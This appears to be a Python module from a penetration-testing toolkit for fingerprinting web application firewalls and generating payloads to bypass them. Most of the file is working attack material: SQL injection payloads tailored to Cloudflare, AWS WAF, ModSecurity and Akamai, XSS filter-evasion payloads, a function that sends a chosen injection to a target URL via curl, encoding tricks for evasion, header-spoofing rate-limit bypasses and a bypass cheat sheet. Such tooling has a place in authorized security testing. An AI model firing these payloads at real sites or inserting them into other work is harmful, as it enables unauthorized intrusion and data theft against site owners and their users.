"""WAF Bypass Module - WAF fingerprinting and bypass payload generation."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "waf"

WAF_BYPASS_SQLI = {
    "Generic": [
        "' OR 1=1--",
        "' OR '1'='1",
        "1' ORDER BY 1--+",
        "1' UNION SELECT NULL--+",
    ],
    "Cloudflare": [
        "/*!50000UNION*//*!50000SELECT*/1,2,3",
        "' /*!50000OR*/ 1=1--",
        "-1'/*!UNION*//*!SELECT*/1,2,3--",
        "' AND 1=1 /*!ORDER BY*/ 1--",
    ],
    "AWS WAF": [
        "' UNION%0ASELECT%0A1,2,3--",
        "' un/**/ion sel/**/ect 1,2,3--",
        "' %55NION %53ELECT 1,2,3--",
    ],
    "ModSecurity": [
        "' /*!00000UNION*/ /*!00000SELECT*/ 1,2,3--",
        "0' div 1' union%23foo*%2F*bar%0D%0Aselect 1,2,3--",
        "' UNION ALL SELECT 1,2,3%23",
    ],
    "Akamai": [
        "'%20OR%20'1'%3D'1",
        "' UNION(SELECT(1),(2),(3))--",
        "' UniOn SeLeCt 1,2,3--",
    ],
}

WAF_BYPASS_XSS = {
    "Generic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ],
    "Tag bypass": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<img/src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<<script>alert(1)//<</script>",
    ],
    "Event handler bypass": [
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "Encoding bypass": [
        "<script>\\u0061lert(1)</script>",
        "<img src=x onerror=\\x61lert(1)>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//%0D%0A",
    ],
}


def _waf_fingerprint(session):
    """Identify WAF type using wafw00f and nmap."""
    target = ask("Enter target URL or IP")
    if not target:
        error("Target required.")
        return

    options = [
        ("1", "[bold]wafw00f[/bold]       - WAF fingerprinting tool"),
        ("2", "[bold]Nmap WAF detect[/bold]- NSE WAF detection"),
        ("3", "[bold]Manual headers[/bold] - Check response headers"),
        ("4", "[bold]All methods[/bold]    - Run all detection methods"),
    ]
    choice = show_menu(options)

    if choice == "1" or choice == "4":
        url = target if target.startswith("http") else f"http://{target}"
        run_with_preview(f"wafw00f {url} -a", session, STAGE)
    if choice == "2" or choice == "4":
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        run_with_preview(f"nmap -p80,443 --script http-waf-detect,http-waf-fingerprint {host}", session, STAGE)
    if choice == "3" or choice == "4":
        url = target if target.startswith("http") else f"http://{target}"
        run_with_preview(f"curl -sI {url} | grep -iE 'server|x-powered|x-cdn|cf-ray|x-amz|x-cache|x-akamai'", session, STAGE)


def _sqli_bypass(session):
    """Generate SQLi bypass payloads for specific WAFs."""
    info("Select target WAF:")
    options = [(str(i+1), f"[bold]{waf}[/bold]") for i, waf in enumerate(WAF_BYPASS_SQLI.keys())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    wafs = list(WAF_BYPASS_SQLI.items())
    if 0 <= idx < len(wafs):
        waf_name, payloads = wafs[idx]
        console.print(f"\n[bold cyan]SQLi Bypass Payloads for {waf_name}:[/bold cyan]\n")
        for i, payload in enumerate(payloads, 1):
            console.print(f"  [yellow]{i}.[/yellow] [green]{payload}[/green]")

        if confirm("\nTest a payload against target?"):
            url = ask("Enter target URL with parameter (e.g., http://target/page?id=)")
            idx2 = int(ask("Payload number to test", default="1")) - 1
            if 0 <= idx2 < len(payloads):
                import urllib.parse
                encoded = urllib.parse.quote(payloads[idx2])
                cmd = f"curl -sk '{url}{encoded}' -o /dev/null -w '%{{http_code}}'"
                run_with_preview(cmd, session, STAGE)


def _xss_bypass(session):
    """Generate XSS bypass payloads."""
    info("Select bypass category:")
    options = [(str(i+1), f"[bold]{cat}[/bold]") for i, cat in enumerate(WAF_BYPASS_XSS.keys())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    cats = list(WAF_BYPASS_XSS.items())
    if 0 <= idx < len(cats):
        cat_name, payloads = cats[idx]
        console.print(f"\n[bold cyan]XSS Bypass - {cat_name}:[/bold cyan]\n")
        for i, payload in enumerate(payloads, 1):
            console.print(f"  [yellow]{i}.[/yellow] [green]{payload}[/green]")


def _encoding_tricks(session):
    """URL/Unicode/HTML encoding for WAF evasion."""
    payload = ask("Enter payload to encode")
    if not payload:
        error("Payload required.")
        return

    import urllib.parse
    import base64

    console.print(f"\n[bold cyan]Encoding Results:[/bold cyan]\n")
    console.print(f"  [yellow]URL encode:[/yellow]     [green]{urllib.parse.quote(payload)}[/green]")
    console.print(f"  [yellow]Double URL:[/yellow]     [green]{urllib.parse.quote(urllib.parse.quote(payload))}[/green]")
    console.print(f"  [yellow]Base64:[/yellow]         [green]{base64.b64encode(payload.encode()).decode()}[/green]")
    hex_encoded = ''.join(f'%{ord(c):02x}' for c in payload)
    unicode_encoded = ''.join('\\u{:04x}'.format(ord(c)) for c in payload)
    html_encoded = ''.join('&#{};'.format(ord(c)) for c in payload)
    console.print(f"  [yellow]Hex:[/yellow]            [green]{hex_encoded}[/green]")
    console.print(f"  [yellow]Unicode:[/yellow]        [green]{unicode_encoded}[/green]")
    console.print(f"  [yellow]HTML entities:[/yellow]  [green]{html_encoded}[/green]")


def _rate_limit_bypass(session):
    """Techniques to bypass rate limiting."""
    info("Rate Limit Bypass Techniques:")
    techniques = [
        ("IP Rotation", "Use X-Forwarded-For header rotation", "curl -H 'X-Forwarded-For: 127.0.0.{i}' target"),
        ("Header Spoofing", "Add origin headers", "curl -H 'X-Real-IP: 1.2.3.4' -H 'X-Originating-IP: 1.2.3.4' target"),
        ("Case Change", "Vary URL case", "/Admin vs /admin vs /ADMIN"),
        ("Path Bypass", "Add path variations", "/./endpoint, //endpoint, /endpoint/., /endpoint%00"),
        ("Method Change", "Try different HTTP methods", "GET → POST → PUT → PATCH"),
    ]

    from rich.table import Table
    table = Table(title="Rate Limit Bypass Techniques", show_header=True)
    table.add_column("Technique", style="cyan bold")
    table.add_column("Description")
    table.add_column("Example", style="green")

    for name, desc, example in techniques:
        table.add_row(name, desc, example)

    console.print(table)


def _cheat_sheet():
    content = """# WAF Bypass Cheat Sheet

## WAF Detection
```
wafw00f http://target -a
nmap -p80,443 --script http-waf-detect target
curl -sI target | grep -iE 'cf-ray|server|x-cdn'
```

## Common WAF Indicators
- Cloudflare: cf-ray header, __cfduid cookie
- AWS WAF: x-amzn-requestid, AWSALB cookie
- Akamai: x-akamai-* headers
- ModSecurity: Server: Apache + 403 on payloads
- F5 BIG-IP: BigipServer cookie

## SQLi Bypass Techniques
- Comments: `/**/`, `/*!*/`, `--+`, `#`
- Case mixing: `UnIoN SeLeCt`
- URL encoding: `%55NION %53ELECT`
- Whitespace alternatives: `%0A`, `%0D`, `%09`, `+`

## XSS Bypass Techniques
- Tag alternatives: `<svg>`, `<details>`, `<marquee>`
- Event handlers: `onfocus`, `ontoggle`, `onstart`
- Encoding: Unicode, HTML entities, Base64+eval

## Tools: wafw00f, sqlmap --tamper, nmap, curl
"""
    show_knowledge(content)


def run(session):
    """WAF Bypass module entry point."""
    show_stage_header("WAF Bypass", "WAF fingerprinting & bypass payload generation")

    while True:
        options = [
            ("1", "[bold]WAF Fingerprint[/bold] - Detect WAF type"),
            ("2", "[bold]SQLi Bypass[/bold]     - WAF-specific SQLi payloads"),
            ("3", "[bold]XSS Bypass[/bold]      - WAF-specific XSS payloads"),
            ("4", "[bold]Encoding Tricks[/bold] - Encode payloads for evasion"),
            ("5", "[bold]Rate Limit Bypass[/bold]- Bypass rate limiting"),
            ("6", "[bold]Cheat Sheet[/bold]     - WAF bypass reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _waf_fingerprint(session)
        elif choice == "2":
            _sqli_bypass(session)
        elif choice == "3":
            _xss_bypass(session)
        elif choice == "4":
            _encoding_tricks(session)
        elif choice == "5":
            _rate_limit_bypass(session)
        elif choice == "6":
            _cheat_sheet()
